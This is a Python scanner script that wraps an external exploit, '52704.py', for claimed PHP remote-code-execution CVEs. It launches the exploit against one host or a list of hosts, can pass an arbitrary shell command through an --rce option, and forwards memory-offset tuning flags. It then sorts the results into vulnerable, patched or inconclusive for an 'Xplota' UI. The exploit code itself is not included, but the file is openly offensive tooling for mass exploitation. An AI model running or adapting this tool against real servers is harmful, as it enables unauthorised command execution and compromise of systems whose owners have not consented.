#!/usr/bin/env python3
"""PHP2Shell RCE chain scanner — CVE-2026-109618 / CVE-2026-109619 (52704 exploit).

Wraps xplotas/php2shell/xplota_1/52704.py for use from the Xplota UI.
Each target is treated as a HOST[:PORT] or bare IP/hostname; the exploit is
run once per target and its exit code plus stdout are translated into the
standard Xplota result format.

Usage (direct):
    python3 scanner.py -u http://192.168.1.100 -o results.json
    python3 scanner.py -l hosts.txt -t 1 -o results.json
"""

from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any
from urllib.parse import urlsplit

CVES = "CVE-2026-109618 / CVE-2026-109619"

# Absolute path of the exploit, relative to this file's directory tree.
_HERE = Path(__file__).resolve().parent
_EXPLOIT = _HERE.parents[3] / "xplotas" / "php2shell" / "xplota_1" / "52704.py"

# Exit-code meanings for 52704.py:
#   0  → full chain succeeded (or disclosure only, without --rce)
#   1  → no Set-Cookie PHPSESSID (not vulnerable / patched)
#   2  → cookie too small (normal session, not vulnerable)
#   3  → no pointer in leak (inconclusive)
#   4  → dominant pointer failed exact-build profile (inconclusive)
#   5  → derived main chunk absent from buckets (inconclusive)
#   6  → RCE stage failed after successful disclosure (inconclusive)
_VULN_EXIT   = {0}
_CLEAN_EXIT  = {1, 2}
_INCON_EXIT  = {3, 4, 5, 6}


def _parse_host_port(raw: str) -> tuple[str, int]:
    """Extract (host, port) from a URL like http://1.2.3.4:8080 or bare host."""
    raw = raw.strip()
    if "://" not in raw:
        raw = "http://" + raw
    p = urlsplit(raw)
    host = p.hostname or raw
    port = p.port or 80
    return host, port


@dataclass
class RunResult:
    target: str
    host: str
    port: int
    exit_code: int | None
    stdout: str
    error: str | None
    elapsed: float


def _run_exploit(
    host: str,
    port: int,
    target_label: str,
    extra_args: list[str],
    timeout: float,
    rce_command: str | None,
    path: str,
) -> RunResult:
    """Launch 52704.py against one host and return a RunResult."""
    cmd = [
        sys.executable, "-u", str(_EXPLOIT),
        "--host", host,
        "--port", str(port),
        "--path", path,
        "--timeout", str(int(timeout)),
    ]
    if rce_command:
        if rce_command.strip():
            cmd += ["--rce", rce_command.strip()]
        else:
            cmd += ["--rce"]
    cmd.extend(extra_args)

    t0 = time.monotonic()
    stdout_lines: list[str] = []
    error: str | None = None
    exit_code: int | None = None

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            cwd=str(_EXPLOIT.parent),
            env={**os.environ, "PYTHONUNBUFFERED": "1"},
            text=True,
            encoding="utf-8",
            errors="replace",
        )

        # Stream stdout so the UI can see live log lines.
        assert proc.stdout is not None
        for line in proc.stdout:
            line = line.rstrip("\r\n")
            if line:
                print(f"[LOG] {line}", flush=True)
                stdout_lines.append(line)

        proc.wait(timeout=5)
        exit_code = proc.returncode
    except subprocess.TimeoutExpired:
        proc.kill()
        error = "exploit process timed out during shutdown"
        exit_code = -1
    except FileNotFoundError:
        error = f"exploit not found: {_EXPLOIT}"
        exit_code = -2
    except Exception as exc:
        error = f"unexpected error launching exploit: {exc}"
        exit_code = -3

    return RunResult(
        target=target_label,
        host=host,
        port=port,
        exit_code=exit_code,
        stdout="\n".join(stdout_lines),
        error=error,
        elapsed=time.monotonic() - t0,
    )


def _result_dict(run: RunResult, scanner_timeout: float) -> dict[str, Any]:
    """Convert a RunResult into the standard Xplota result JSON object."""
    code = run.exit_code

    if run.error and code not in (0, 1, 2, 3, 4, 5, 6):
        vulnerable: bool | None = None
        verdict = "ERROR"
        reason = run.error
    elif code in _VULN_EXIT:
        vulnerable = True
        verdict = "VULNERABLE"
        # Pull the most informative line from stdout.
        summary_line = ""
        for ln in reversed(run.stdout.splitlines()):
            if "[+]" in ln:
                summary_line = ln.split("]", 1)[-1].strip()
                break
        reason = summary_line or "RCE chain or disclosure succeeded (exit 0)"
    elif code in _CLEAN_EXIT:
        vulnerable = False
        verdict = "NOT VULNERABLE"
        reason = {
            1: "No overlong Set-Cookie/PHPSESSID in response — target appears patched",
            2: "Cookie size is normal — session not forged, target appears patched",
        }.get(code, f"Not vulnerable (exit {code})")
    else:
        vulnerable = None
        verdict = "INCONCLUSIVE"
        reason = {
            3: "Disclosure succeeded but no pointer candidates found in cookie",
            4: "Dominant pointer does not match the exact-build profile",
            5: "Derived Zend main chunk absent from leaked pointer buckets",
            6: "Disclosure succeeded but RCE stage did not confirm execution",
            -1: "Exploit timed out",
        }.get(code, f"Inconclusive (exit {code})")

    result: dict[str, Any] = {
        "target": run.target,
        "url": run.target,
        "tested_url": run.target,
        "vulnerable": vulnerable,
        "verdict": verdict,
        "reason": reason,
        "error": run.error,
        "elapsed": round(run.elapsed, 2),
        "exit_code": code,
        "log": run.stdout[-4096:] if len(run.stdout) > 4096 else run.stdout,
    }

    # Emit the Xplota live-result line so the streaming UI picks it up.
    detail = f" - {reason}" if reason else ""
    bracket = "VULNERABLE" if vulnerable is True else ("NOT VULNERABLE" if vulnerable is False else "INCONCLUSIVE")
    print(f"[{bracket}] {run.target}{detail}", flush=True)

    return result


def main() -> None:  # noqa: C901
    ap = argparse.ArgumentParser(
        description="Xplota UI wrapper for the PHP2Shell 52704 exploit"
    )
    group = ap.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Single target URL or host[:port]")
    group.add_argument("-l", "--list", dest="list", metavar="FILE",
                       help="File with one target per line")
    ap.add_argument("-o", "--output", required=True,
                    help="JSON file to write results to")
    ap.add_argument("-t", "--threads", type=int, default=1,
                    help="Parallel targets (use 1 — the exploit is stateful and "
                         "thread-intensive per target)")
    ap.add_argument("--timeout", type=int, default=600,
                    help="Per-target timeout in seconds (default: 600)")
    ap.add_argument("--no-color", action="store_true")
    ap.add_argument("--verbose", "-v", action="store_true")
    ap.add_argument("--all-results", action="store_true",
                    help="Include clean/inconclusive targets in the output file")
    # Exploit-specific options surfaced in the UI via extra_fields:
    ap.add_argument("--path", default="/index.php",
                    help="PHP endpoint path on the target")
    ap.add_argument("--rce", default="",
                    help="Shell command to run via RCE (empty = disclosure only)")
    ap.add_argument("--forge-page", default="",
                    help="Stale-session-ID page override (hex, e.g. 0x1e3)")
    ap.add_argument("--pointer-floor", default="",
                    help="Minimum valid pointer value (hex, e.g. 0x6f0000000000)")
    ap.add_argument("--heap-from-lib-delta", default="",
                    help="Zend main-chunk delta from libphp (hex, e.g. 0x3400000)")
    ap.add_argument("--zval-ptr-dtor-offset", default="",
                    help="zval_ptr_dtor offset in libphp (hex, e.g. 0x7ae960)")
    ap.add_argument("--rce-block-offset", default="",
                    help="Controlled block offset after disclosure (hex)")
    ap.add_argument("--rce-headers", default="",
                    help="Number of duplicate multipart headers for the RCE sink")
    args = ap.parse_args()

    # Build targets list.
    if args.url:
        targets = [args.url.strip()]
    else:
        p = Path(args.list)
        if not p.is_file():
            print(f"Error: list file not found: {args.list}", file=sys.stderr)
            raise SystemExit(1)
        targets = [ln.strip() for ln in p.read_text(encoding="utf-8").splitlines()
                   if ln.strip() and not ln.strip().startswith("#")]

    if not targets:
        print("Error: no targets", file=sys.stderr)
        raise SystemExit(1)

    # Extra exploit args to forward (only if the user supplied them).
    extra: list[str] = []
    for opt, val in [
        ("--forge-page", args.forge_page),
        ("--pointer-floor", args.pointer_floor),
        ("--heap-from-lib-delta", args.heap_from_lib_delta),
        ("--zval-ptr-dtor-offset", args.zval_ptr_dtor_offset),
        ("--rce-block-offset", args.rce_block_offset),
        ("--rce-headers", args.rce_headers),
    ]:
        if val and val.strip():
            extra += [opt, val.strip()]

    rce_command: str | None = args.rce.strip() if args.rce else None
    # Empty string means "disclosure only" (don't pass --rce at all).
    # We use None to mean "do not pass the flag".

    results: list[dict[str, Any]] = []
    threads = max(1, min(args.threads, 4))  # cap at 4; exploit is very heavy
    lock = threading.Lock()

    def process(target: str) -> None:
        host, port = _parse_host_port(target)
        run = _run_exploit(
            host=host,
            port=port,
            target_label=target,
            extra_args=extra,
            timeout=float(args.timeout),
            rce_command=rce_command,
            path=args.path,
        )
        r = _result_dict(run, float(args.timeout))
        with lock:
            if args.all_results or r["vulnerable"] is not False:
                results.append(r)

    if threads == 1 or len(targets) == 1:
        for t in targets:
            process(t)
    else:
        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=threads) as pool:
            futs = {pool.submit(process, t): t for t in targets}
            for fut in as_completed(futs):
                try:
                    fut.result()
                except Exception as exc:
                    print(f"[ERROR] {futs[fut]}: {exc}", flush=True)

    out = Path(args.output)
    out.write_text(json.dumps(results, indent=2), encoding="utf-8")
    if args.verbose:
        print(f"[*] wrote {len(results)} result(s) to {out}", flush=True)

    vuln = sum(1 for r in results if r["vulnerable"] is True)
    raise SystemExit(1 if vuln else 0)


if __name__ == "__main__":
    main()
